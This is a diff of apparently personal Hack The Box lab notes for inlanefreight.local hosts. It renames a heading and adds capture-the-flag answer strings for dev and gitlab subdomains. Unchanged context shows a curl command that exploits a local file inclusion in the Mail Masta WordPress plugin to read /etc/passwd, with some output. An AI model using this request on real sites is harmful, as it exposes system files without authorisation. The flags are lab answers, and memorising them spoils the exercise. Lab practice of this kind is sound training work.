@@ -445,7 +445,7 @@ Interesting Finding(s):
 ```
 
 
-## ir lfi
+## ir.inlanefreight.local
 
 ```shell
 curl "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
@@ -477,3 +477,12 @@ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
  
 HTB{e7134abea7438e937b87608eab0d979c}
 ```
+
+
+## dev.inlanefreight.local
+
+HTB{57c7f6d939eeda90aa1488b15617b9fa}
+
+## gitlab.inlanefreight.local
+
+HTB{32596e8376077c3ef8d5cf52f15279ba}
